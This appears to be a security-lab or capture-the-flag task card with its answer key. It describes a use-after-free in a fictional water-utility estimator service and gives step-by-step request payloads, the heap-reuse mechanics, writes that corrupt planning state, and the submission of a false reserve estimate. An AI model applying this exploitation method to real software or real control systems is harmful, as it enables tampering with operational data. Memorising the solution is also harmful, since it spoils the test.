### Surface and normal behavior

`a-diagnostics` (diagnostic-services at 10.77.63.50) owns this card. The engineering workbench (process-view.arwc.test) proxies the participant's requests to diagnostics using `X-ARWC-Internal: historian-r21`. The participant uses their CORPORATE Bearer token.

**Service routes** (via process-view.arwc.test):

**Step 1**—Get baseline estimator and binary:
`POST /api/control-commands` → `{"estimator": "EST-CRR-23", "mode": "baseline"}`
- Returns: `record_id=EST-CRR-23`, `sha256`, `object_size=144`, `operation_limit=8`, ordinary results
- Returns `artifact_b64` (the estimator23 ELF binary for analysis)

**Step 2**—Demonstrate use-after-free side effect:
`POST /api/control-commands` → measurement operation sequence:
```json
{"estimator": "EST-CRR-23", "operations": [
    {"op": "add", "source_id": "FIT-CRR-204B", "value": 12.4},
    {"op": "add", "source_id": "FIT-CRR-204B", "value": 12.4},
    {"op": "add", "source_id": "PROBE-CRR-23", "value": 0.0},
    {"op": "write-stale", "source_id": "FIT-CRR-204B", "offset": 64, "u32": 1129468466}
]}
```
- Sets `side_effect_observed=True`
- Returns: `record_id=EST-UAF-CRR-23`, `controlled_offset=64`, `controlled_u32=1129468466`, `target=PROBE-CRR-23`

**UAF mechanic** (derived from binary analysis):
- The estimator stores 0x90-byte `Measurement` objects in a vector and a source-ID index
- Adding a duplicate source ID (`FIT-CRR-204B` twice) triggers deallocation of the first element but the index pointer remains
- glibc 2.39 tcache returns the freed chunk when `PlanningState` (also 0x90 bytes) is allocated
- The stale index pointer overlaps the new PlanningState; `u32` at offset 64 of Measurement = `vtable >> 8` of PlanningState
- `0x4553544352523233 >> 8 = 0x45535443525232xx` → low 32 bits `0x43525232` = 1129468466

**Step 3**—Demonstrate controlled state violation:
`POST /api/control-commands/consequence` → state corruption sequence:
```json
{"estimator": "EST-CRR-23", "operations": [
    {"op": "remove-duplicate", "source_id": "FIT-CRR-204B"},
    {"op": "add-state", "district_id": "Cairn Reach"},
    {"op": "remove-state", "district_id": "Cairn Reach"},
    {"op": "add-state", "district_id": "Cairn Reach"},
    {"op": "write-stale", "offset": 40, "f64": 13.4},
    {"op": "write-stale", "offset": 48, "u32": 1}
]}
```
- Sets `protected_state_controlled=True`
- Returns: `record_id=EST-STATE-CRR-23`, `district_id=Cairn Reach`, `reserve_ml=13.4`, `quality=1`

**Step 4**—Submit false estimator result to planning data:
`POST /api/estimator-runs` → `{"allocation_case": "ALLOC-CASE-CRR-33", "district_id": "Cairn Reach", "reserve_ml": 13.4, "quality": 1, "unaffected": {"North": 8.1, "Merewick": 7.65}}`
- Sets `false_estimate_observed=True`
- Returns: `record_id=ALLOC-CASE-CRR-33`, `revision=33`, `estimate`, `quality=valid`

### Vulnerability and intended solution

The authored condition is **measurement-list use-after-free**. Estimator 23 stores 0x90-byte measurement objects in a vector and a source-ID index. Coalescing a second object with the same source ID erases the vector element but leaves that exact pointer in the index until the next calculation. The route exposes only eight add/remove operations, verifies source-ID syntax, and uses glibc 2.39 single-threaded tcache; ordinary unique-source calculations remain memory safe. The hand build must preserve every named version, encoding, bound, validation order, identity, and unaffected field; substituting a generic vulnerable service would change the task.

The required result is: Demonstrate a reproducible controlled state violation. A crash or an ordinary change caused by a valid measurement does not establish the result. Process quantities and state separation are governed by `arwc-process-model.md`, specifically `ALLOC-CASE-CRR-33`.

## Hints

### Hint 1

Download and analyze the binary—it is a static C++ binary using 0x90-byte `Measurement` objects stored in both a `vector` and a source-ID `unordered_map` index.

### Hint 2

The UAF: adding a duplicate source ID coalesces two measurements—the vector element is freed but the source-ID index retains the stale pointer. With glibc 2.39 tcache, a new 0x90-byte `PlanningState` allocation returns the same chunk. The service returns `EST-UAF-CRR-23` and `controlled_offset=64`.
